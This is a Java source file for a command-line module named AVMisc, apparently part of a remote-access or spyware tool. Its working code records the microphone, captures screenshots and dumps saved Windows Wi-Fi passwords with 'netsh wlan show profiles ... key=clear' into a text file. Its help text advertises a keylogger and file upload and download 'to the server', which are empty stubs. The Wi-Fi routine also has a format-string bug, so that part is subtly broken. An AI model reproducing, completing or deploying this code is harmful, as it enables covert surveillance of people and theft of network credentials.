package com.AVMisc;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Mixer.Info;
import de.ralleytn.simple.audio.Audio;
import de.ralleytn.simple.audio.AudioEvent;
import de.ralleytn.simple.audio.AudioException;
import de.ralleytn.simple.audio.Recorder;
import de.ralleytn.simple.audio.StreamedAudio;

public class AVMisc {
	private static final DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM_dd_yy_HH_mm");
	private static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 1, 4, 44100, false);
	private long RECORD_TIME = 0;
	private Scanner sc;
	private Thread recordingAudioThread;
	private Thread playingAudioThread;
	private AtomicBoolean recordingAudio = new AtomicBoolean();
	private AtomicBoolean playingAudio = new AtomicBoolean();
	private String recordingAudioFileName;
	private String playingAudioFileName;
	private Audio audio;
	private Recorder recorder;

	public static void main(String[] args) {
		AVMisc av = new AVMisc();
		av.begin();
		// System.getProperty("os.name")
	}
	
	public AVMisc() {
		sc = new Scanner(System.in);
		recordingAudio.set(false);
		playingAudio.set(false);
	}
	
	// Microphone
	// Speakers
	// Keyboard
	// Wifi (check if os is windows)
	// Screenshot
	
	private void begin() {
		String command;
		while (true) {
			System.out.print("av_misc>");
			command = sc.nextLine();
			switch (command.toLowerCase()) {
				case "list":
					listAudioDevices();
					break;
				case "start_audio_record":
					recordAudio();
					break;
				case "stop_audio_record":
					stopRecordingAudio();
					break;
				case "start_audio_playback":
					playAudio();
					break;
				case "stop_audio_playback":
					stopPlayingAudio();
					break;
				case "screenshot":
					takeScreenshot();
					break;
				case "start_kl":
					startKeylogger();
					break;
				case "stop_kl":
					stopKeylogger();
					break;
				case "wifi":
					getWifiInfo();
					break;
				case "upload":
					upload();
					break;
				case "download":
					download();
					break;
				case "help":
					showHelp();
					break;
				case "quit":
				case "exit":
					System.exit(0);
				default:
					System.out.printf("'%s' is not a recognized command. Type 'help' for a list of available commands.\n", command);
			}
		}
	}
	
	/***
	 * List Devices
	 */
	private void listAudioDevices() {
		Info[] audioSystem = AudioSystem.getMixerInfo();
		if(audioSystem.length != 0) {
			System.out.println("------------------------\n     AUDIO DEVICES\n------------------------");
			for (int i = 0; i < audioSystem.length; i++) {
				Info device = audioSystem[i];
				System.out.printf("\tID: %d, Name: %s, Description: %s\n\n", i, device.getName(), device.getDescription());
			}
		}
		audioSystem = null;
	}
	
	/***
	 * Record Audio
	 */
	private void recordAudio() {
		if (!recordingAudio.get()) {
			int time = 0;
			try {
				// Get the time to record the audio
				System.out.print("Enter the record time in seconds: ");
				time = Integer.parseInt(sc.nextLine());
				if (time <= 0) {
					throw new NumberFormatException("Time entered is invalid.");
				} 
			} 
			catch (NumberFormatException e) {
				System.out.println(e.getMessage());
				return;
			}
			RECORD_TIME = time * 1000;
			recordingAudioFileName = String.format("Audio_%s.au", dtf.format(LocalDateTime.now()));
			recordingAudioThread = new Thread() {
				@Override
				public void run() {
					try(FileOutputStream fos = new FileOutputStream(recordingAudioFileName)) {
						recorder = new Recorder();
						recorder.start(fos);
						recordingAudio.set(true);
						System.out.println("Recording...");
						Thread.sleep(RECORD_TIME);
					} 
					catch (AudioException | IOException e) {
						System.out.println(e.getMessage());
					}
					catch(InterruptedException e) { }
					finally {
						recorder.stop();
						recordingAudio.set(false);
						System.out.printf("Audio recording saved as: '%s'.\n", recordingAudioFileName);
					}
				}
			};
			recordingAudioThread.start();
		}
	}
	
	
	/***
	 * Stop Recording Audio
	 */
	private void stopRecordingAudio() {
		if(recordingAudio.get()) {
			recordingAudioThread.interrupt();
		}
	}
	
	/***
	 * Play Audio
	 */
	private void playAudio() {
		if(!playingAudio.get()) {
			System.out.print("Enter the path of the audio file to play: ");
			String fileName = sc.nextLine();
			playingAudioThread = new Thread() {
				@Override
				public void run() {
					try {
						if(!Files.exists(Paths.get(fileName))) {
							throw new FileNotFoundException(String.format("The file '%s' does not exist.", fileName));
						}
						playingAudioFileName = fileName;
						audio = new StreamedAudio(playingAudioFileName);
						audio.addAudioListener(event -> {
							if(event.getType() == AudioEvent.Type.REACHED_END) {
								event.getAudio().close();
							}
						});
						audio.open();
						audio.play();
						playingAudio.set(true);
					}
					catch(AudioException | FileNotFoundException e) {
						e.printStackTrace();
					}
				}
			};
			playingAudioThread.start();
		}
	}
	
	/***
	 * Stop Playing Audio
	 */
	private void stopPlayingAudio() {
		if(playingAudio.get()) {
			audio.stop();
			audio.close();
			audio = null;
			playingAudio.set(false);
		}
	}
	
	/***
	 * Take a Screenshot
	 */
	private void takeScreenshot() {
		try {
			Robot robot = new Robot();
			String fileName = String.format("Screenshot_%s.jpg", dtf.format(LocalDateTime.now()));
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenImage = robot.createScreenCapture(screenRect);
			ImageIO.write(screenImage, "jpg", new File(fileName));
			System.out.printf("Screenshot saved as '%s'\n", fileName);
		}
		catch (AWTException | IOException e) {
			System.out.println(e.getMessage());
		}
	}

	
	/***
	 * Start Keylogger
	 */
	private void startKeylogger() {
		
	}
	
	/***
	 * Stop Keylogger
	 */
	private void stopKeylogger() {
		
	}
	
	/***
	 * Get Wifi Info
	 */
	private void getWifiInfo() {
		String profiles = "";
		try {
			Process p = Runtime.getRuntime().exec("netsh.exe wlan show profiles");
			BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String val;
			while((val = in.readLine()) != null) {
				profiles += val + "\n";
			}
			String[] lines = profiles.split("\n");
			List<String> ssids = Arrays.stream(lines)
					.map(l -> l.trim())
					.filter(l -> l.startsWith("All"))
					.map(l -> l.substring(23))
					.collect(Collectors.toList());
			if(ssids.size() == 0) {
				in.close();
				return;
			}
			String data = "";
			for (String id : ssids) {
				String cmd = String.format("netsh.exe wlan show profiles name=\"%s\" key=clear", id);
				p = Runtime.getRuntime().exec(cmd);
				in = new BufferedReader(new InputStreamReader(p.getInputStream()));
				String profile = "";
				val = null;
				while ((val = in.readLine()) != null) {
					profile += val;
				}
				Stream<String> line = Arrays.stream(profile.split("\n"))
						.map(l -> l.trim())
						.filter(l -> l.startsWith("Key Content"));
				if(line.count() > 0) {
					data += String.format("------------------\n\nSSID: %s\nPASSKEY: %s\n\n",
							line.map(l -> l.substring(25)).toArray()[0]);
				}
			}
			String fileName = "wifi.txt";
			BufferedWriter writer = new BufferedWriter(new FileWriter(fileName));
			writer.write(data);
			writer.close();
			System.out.printf("Wifi data saved as %s\n", fileName);
		}
		catch (IOException e) {
			System.out.println(e.getMessage());
		}
	}
	
	/***
	 * Upload files
	 */
	private void upload() {
		System.out.print("Enter the name of the file");
	}
	
	/***
	 * Download files
	 */
	private void download() {
		
	}
	
	/***
	 * Show Help
	 */
	private void showHelp() {
		String helpMsg = "------------------------\n     AVMISC OPTIONS\n------------------------\n"
				+ "\t'list': List the audio devices on the system\n\n"
				+ "\t'start_audio_record': Start recording audio on the system\n\n"
				+ "\t'stop_audio_record': Stop recording audio\n\n"
				+ "\t'start_audio_playback': Play an audio file on the system\n\n"
				+ "\t'stop_audio_playback': Stop playing audio\n\n"
				+ "\t'screenshot': Take a screenshot\n\n"
				+ "\t'start_kl': Start the keylogger\n\n"
				+ "\t'stop_kl': Stop the keylogger\n\n"
				+ "\t'wifi': Get the passwords for the wireless profiles on the system(Windows only)\n\n"
				+ "\t'upload': Upload a file to the server\n\n"
				+ "\t'download': Download a file from the server\n\n"
				+ "\t'help': Show this help message\n";
		System.out.println(helpMsg);
		
	}
	
}
